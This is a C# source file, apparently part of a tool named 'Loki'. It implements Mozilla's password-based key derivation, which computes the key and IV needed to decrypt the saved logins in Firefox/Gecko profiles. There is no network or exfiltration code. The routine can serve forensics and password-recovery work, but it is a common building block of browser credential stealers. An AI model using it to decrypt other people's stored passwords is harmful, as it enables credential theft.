namespace Loki.Gecko
{
    using System;
    using System.Security.Cryptography;

    public class MozillaPBE
    {
        private byte[] GlobalSalt { get; set; }
        private byte[] MasterPassword { get; set; }
        private byte[] EntrySalt { get; set; }

        private byte[] key;

        public byte[] GetKey() => this.key;

        private void SetKey(byte[] value) => this.key = value;

        private byte[] iV;

        public byte[] GetIV() => this.iV;

        private void SetIV(byte[] value)
        {
            this.iV = value;
        }

        public MozillaPBE(byte[] GlobalSalt, byte[] MasterPassword, byte[] EntrySalt)
        {
            this.GlobalSalt = GlobalSalt;
            this.MasterPassword = MasterPassword;
            this.EntrySalt = EntrySalt;
        }

        public void Compute()
        {
            using (var sHA1CryptoServiceProvider = new SHA1CryptoServiceProvider())
            {
                byte[] array = new byte[this.GlobalSalt.Length + this.MasterPassword.Length];
                Array.Copy(this.GlobalSalt, 0, array, 0, this.GlobalSalt.Length);
                Array.Copy(this.MasterPassword, 0, array, this.GlobalSalt.Length, this.MasterPassword.Length);
                byte[] array2 = sHA1CryptoServiceProvider.ComputeHash(array);
                byte[] array3 = new byte[array2.Length + this.EntrySalt.Length];
                Array.Copy(array2, 0, array3, 0, array2.Length);
                Array.Copy(this.EntrySalt, 0, array3, array2.Length, this.EntrySalt.Length);
                byte[] key = sHA1CryptoServiceProvider.ComputeHash(array3);
                byte[] array4 = new byte[20];
                Array.Copy(this.EntrySalt, 0, array4, 0, this.EntrySalt.Length);
                for (int i = this.EntrySalt.Length; i < 20; i++)
                {
                    array4[i] = 0;
                }
                byte[] array5 = new byte[array4.Length + this.EntrySalt.Length];
                Array.Copy(array4, 0, array5, 0, array4.Length);
                Array.Copy(this.EntrySalt, 0, array5, array4.Length, this.EntrySalt.Length);
                byte[] array6, array9;
                using (var hMACSHA = new HMACSHA1(key))
                {
                    array6 = hMACSHA.ComputeHash(array5);
                    byte[] array7 = hMACSHA.ComputeHash(array4);
                    byte[] array8 = new byte[array7.Length + this.EntrySalt.Length];
                    Array.Copy(array7, 0, array8, 0, array7.Length);
                    Array.Copy(this.EntrySalt, 0, array8, array7.Length, this.EntrySalt.Length);
                    array9 = hMACSHA.ComputeHash(array8);
                }
                byte[] array10 = new byte[array6.Length + array9.Length];
                Array.Copy(array6, 0, array10, 0, array6.Length);
                Array.Copy(array9, 0, array10, array6.Length, array9.Length);
                SetKey(new byte[24]);
                for (int j = 0; j < GetKey().Length; j++)
                {
                    GetKey()[j] = array10[j];
                }
                SetIV(new byte[8]);
                int num = GetIV().Length - 1;
                for (int num2 = array10.Length - 1; num2 >= array10.Length - GetIV().Length; num2--)
                {
                    GetIV()[num] = array10[num2];
                    num--;
                }
            }
        }
    }
}